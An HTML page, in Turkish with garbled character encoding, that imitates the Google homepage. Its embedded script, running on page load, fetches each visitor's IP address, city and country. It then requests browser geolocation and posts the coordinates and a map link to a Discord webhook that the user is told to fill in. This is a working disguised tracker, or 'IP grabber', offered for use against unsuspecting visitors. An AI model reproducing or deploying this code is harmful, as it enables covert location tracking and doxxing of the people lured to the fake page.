<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Google</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fff;
            color: #202124;
        }

        /* Ãœst Bilgi */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #dadce0;
        }

        .top-bar-right {
            display: flex;
            align-items: center;
        }

        .gmail-link, .images-link, .app-icon {
            margin-right: 20px;
            text-decoration: none;
            color: #202124;
        }

        .account-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #ccc;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 18px;
            cursor: pointer;
        }

        /* Ana Ä°Ã§erik */
        .content {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 100px;
        }

        .google-logo {
            width: 272px;
            margin-bottom: 20px;
        }

        .search-bar-container {
            display: flex;
            align-items: center;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            padding: 10px 20px;
            width: 600px;
            max-width: 80%;
            margin-bottom: 20px;
        }

        .search-icon, .mic-icon {
            margin-right: 10px;
            color: #9aa0a6;
        }

        .search-input {
            border: none;
            outline: none;
            font-size: 16px;
            width: 100%;
        }

        .buttons {
            margin-top: 20px;
        }

        .search-button, .lucky-button {
            background-color: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            padding: 10px 16px;
            font-size: 14px;
            color: #5f6368;
            cursor: pointer;
            margin: 0 5px;
        }

        /* Alt Bilgi */
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #f2f2f2;
            padding: 15px;
            font-size: 14px;
            color: #70757a;
            border-top: 1px solid #dadce0;
        }

        .footer-links {
            display: flex;
            justify-content: space-between;
        }

        .footer-link {
            text-decoration: none;
            color: #70757a;
            margin: 0 10px;
        }

        /* Konum Bekleniyor MesajÄ± */
        .location-message {
            margin-top: 20px;
            font-size: 16px;
            color: #333;
            display: none; /* BaÅŸlangÄ±Ã§ta gizli */
        }
        .location-message.show {
            display: block;
        }
    </style>
</head>
<body>
    <!-- Ãœst Bilgi -->
    <div class="top-bar">
        <div class="top-bar-left">
        </div>
        <div class="top-bar-right">
            <a href="#" class="gmail-link">Gmail</a>
            <a href="#" class="images-link">GÃ¶rseller</a>
            <div class="app-icon">&#9776;</div>
            <div class="account-icon">A</div>
        </div>
    </div>

    <!-- Ana Ä°Ã§erik -->
    <div class="content">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
        <div class="search-bar-container">
            <span class="search-icon">&#128269;</span>
            <input type="text" class="search-input" placeholder="Google'da arayÄ±n veya bir URL yazÄ±n">
            <span class="mic-icon">&#127928;</span>
        </div>
        <div class="buttons">
            <button class="search-button">Google'da Ara</button>
            <button class="lucky-button">Kendimi ÅžanslÄ± Hissediyorum</button>
        </div>
        <p class="location-message" id="locationMessage">Konum bekleniyor...</p>
    </div>

    <!-- Alt Bilgi -->
    <div class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">Reklam</a>
            <a href="#" class="footer-link">Ä°ÅŸletmeler</a>
            <a href="#" class="footer-link">HakkÄ±nda</a>
            <a href="#" class="footer-link">Gizlilik</a>
            <a href="#" class="footer-link">Åžartlar</a>
            <a href="#" class="footer-link">Ayarlar</a>
        </div>
    </div>

    <script>
        // WEBHOOK URL'NÄ°ZÄ° BURAYA YAZIN (Discord iÃ§in)
        const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // Ã–RNEK
        const locationMessage = document.getElementById('locationMessage');

        // IP Adresini Al ve Webhook'a GÃ¶nder
        async function getAndSendIP() {
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                if (!ipResponse.ok) {
                    throw new Error(`IP adresi alÄ±namadÄ±: ${ipResponse.status} ${ipResponse.statusText}`);
                }
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;
                const city = ipData.city;
                const country = ipData.country_name;

                // IP bilgisini Discord'a gÃ¶nder
                await sendToDiscord({
                    content: `ðŸŒ **IP Bilgisi:**`,
                    embeds: [{
                        title: "IP Bilgileri",
                        color: 5814783,
                        fields: [
                            { name: "IP Adresi", value: `\`${ipAddress}\``, inline: true },
                            { name: "Åžehir", value: `\`${city}\``, inline: true },
                            { name: "Ãœlke", value: `\`${country}\``, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                });
            } catch (error) {
                console.error("IP adresi alÄ±nÄ±rken veya gÃ¶nderilirken hata:", error);
                await sendToDiscord({ content: `âš ï¸ **IP HatasÄ±:** IP adresi alÄ±namadÄ± veya gÃ¶nderilemedi.` });
            }
        }

        // Konum Ä°zni Ä°steme ve Webhook'a GÃ¶nderme
        function requestLocationPermission() {
            if ("geolocation" in navigator) {
                locationMessage.classList.add('show'); // "Konum bekleniyor..." mesajÄ±nÄ± gÃ¶ster
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                        // Konum bilgisini Discord'a gÃ¶nder
                        await sendToDiscord({
                            content: `ðŸ“ **Konum Bilgisi:**`,
                            embeds: [{
                                title: "Konum Bilgisi",
                                color: 5814783,
                                fields: [
                                    { name: "Enlem (Latitude)", value: `\`${latitude}\``, inline: true },
                                    { name: "Boylam (Longitude)", value: `\`${longitude}\``, inline: true },
                                    { name: "DoÄŸruluk", value: `\`~${accuracy.toFixed(0)} metre\``, inline: true },
                                    { name: "Harita Linki", value: `[Google Maps](${mapsUrl})`, inline: false }
                                ],
                                timestamp: new Date().toISOString()
                            }]
                        });
                        locationMessage.classList.remove('show'); // MesajÄ± gizle
                    },
                    (error) => {
                        let errorMessage = "Konum alÄ±namadÄ±.";
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Konum izni reddedildi.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Konum bilgisi mevcut deÄŸil.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Konum isteÄŸi zaman aÅŸÄ±mÄ±na uÄŸradÄ±.";
                                break;
                        }
                        alert(errorMessage);
                        locationMessage.classList.remove('show'); // MesajÄ± gizle
                    }
                );
            } else {
                alert("TarayÄ±cÄ±nÄ±z konum Ã¶zelliÄŸini desteklemiyor.");
                locationMessage.classList.remove('show'); // MesajÄ± gizle
            }
        }

        // Discord'a GÃ¶nderme Fonksiyonu
        async function sendToDiscord(payload) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (!response.ok) {
                    throw new Error(`Webhook gÃ¶nderilemedi: ${response.status} ${response.statusText}`);
                }
                console.log("Discord'a log baÅŸarÄ±yla gÃ¶nderildi.");
            } catch (discordError) {
                console.error("Discord'a log gÃ¶nderilirken hata:", discordError);
                // Hata durumunda uyarÄ± vermek veya log tutmak iÃ§in bir iÅŸlem yapabilirsiniz.
            }
        }

        // Sayfa yÃ¼klendiÄŸinde IP'yi al ve konum iznini iste
        window.onload = async () => {
            await getAndSendIP(); // Sayfa yÃ¼klendiÄŸinde IP'yi al
            requestLocationPermission(); // Konum iznini iste
        };
    </script>
</body>
</html>
